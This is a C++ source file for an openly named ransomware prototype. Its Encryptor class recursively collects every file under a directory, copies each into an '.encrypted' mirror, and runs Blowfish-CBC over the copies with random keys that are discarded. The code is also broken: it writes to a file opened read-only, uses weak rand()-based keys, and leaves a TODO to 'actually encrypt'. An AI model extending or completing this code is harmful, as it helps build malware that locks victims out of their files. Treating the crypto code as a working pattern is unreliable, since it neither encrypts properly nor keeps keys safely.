#include "ransomware.h"

#include <iostream>
#include <filesystem>
#include <exception>
#include <vector>
#include <openssl/evp.h>
//#include <openssl/aes.h>

#include <fmt/format.h>

Encryptor::Encryptor(std::filesystem::path const &rootPath)
        : rootPath_(rootPath) {
    auto rootEntry = std::filesystem::directory_entry(rootPath);
    if (!rootEntry.is_directory()) {
        throw std::runtime_error(fmt::format("{} is not a directory", std::filesystem::absolute(rootPath).string()));
    }

    encryptedDir_ = rootPath;
    encryptedDir_ /= std::filesystem::path(ENCRYPTED_DIR_NAME);
    std::cout << fmt::format("Encrypted dir path: {}\n", encryptedDir_.string());

    if (std::filesystem::exists(encryptedDir_)) {
        throw std::runtime_error(fmt::format("{} already exists", std::filesystem::absolute(encryptedDir_).string()));
    }

    ProcessDirectory(rootEntry);

    for (auto &file: regularFiles_) {
        std::cout << fmt::format("Found regular file for encryption: {}\n", file.string());
    }

    std::filesystem::create_directory(encryptedDir_);
    for (auto &dir: directories_) {
        auto path = encryptedDir_;
        path /= dir.lexically_relative(rootPath);
        std::filesystem::create_directory(path);
    }
}

void Encryptor::ProcessDirectory(const std::filesystem::directory_entry &rootEntry) {
    for (auto &e: std::filesystem::recursive_directory_iterator(rootEntry)) {
        if (e.is_regular_file()) {
            regularFiles_.emplace_back(e.path());
        } else if (e.is_directory()) {
            directories_.emplace_back(e.path());
        }
    }
}

void Encryptor::Encrypt() {
    for (auto &filePath: regularFiles_) {
        EncryptRegularFile(filePath);
    }

    std::cout << "Encryption finished\n";
}

unsigned char *generate_key(int length) {
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
    auto *randomString = static_cast<unsigned char *>(malloc(sizeof(char) * (length + 1)));;
    int key;

    if (randomString) {
        for (int n = 0; n < length; n++) {
            key = std::rand() % (int) (sizeof(charset) - 1);
            randomString[n] = charset[key];
        }

        randomString[length] = '\0';
    }
    return randomString;
}

int encrypt(std::filesystem::path const &filePath) {
    std::cout << fmt::format("Encrypted file path: {}\n", filePath.string());
    FILE *file = std::fopen(filePath.c_str(), "rb");
    if (!file) {
        std::perror(fmt::format("File opening failed {}", filePath.string()).c_str());
        return EXIT_FAILURE;
    }

    const unsigned char *iv = generate_key(16);
    const unsigned char *key = generate_key(32);

    int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen;
    int outlen;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_CIPHER_CTX_init(ctx);
    EVP_CipherInit_ex(ctx, EVP_bf_cbc(), nullptr, nullptr, nullptr, 1); // 1 encrypt - 0 decrypt
    EVP_CIPHER_CTX_set_key_length(ctx, 16);
    EVP_CipherInit_ex(ctx, nullptr, nullptr, key, iv, 1);
    while (true) {
        inlen = fread(inbuf, 1, chunk_size, file);
        if (inlen <= 0) {
            break;
        }
        if (!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)) {
            EVP_CIPHER_CTX_cleanup(ctx);
            return EXIT_FAILURE;
        }
        fwrite(outbuf, 1, outlen, file);
    }
    if (!EVP_CipherFinal_ex(ctx, outbuf, &outlen)) {
        EVP_CIPHER_CTX_cleanup(ctx);
        return EXIT_FAILURE;
    }
    fwrite(outbuf, 1, outlen, file);
    EVP_CIPHER_CTX_cleanup(ctx);

    rewind(file);
    free((void *) key);
    free((void *) iv);
    return 0;
}

void Encryptor::EncryptRegularFile(std::filesystem::path const &filePath) {
    std::cout << fmt::format("Processing regular file: {}\n", filePath.string());
    auto encryptedPath = encryptedDir_;
    encryptedPath /= filePath.lexically_relative(rootPath_);
    encryptedPath += ".encrypted";

    std::filesystem::copy(filePath, encryptedPath);
    encrypt(encryptedPath);
    // TODO: actually encrypt

    std::cout << fmt::format("Encrypted to: {}\n", encryptedPath.string());
}
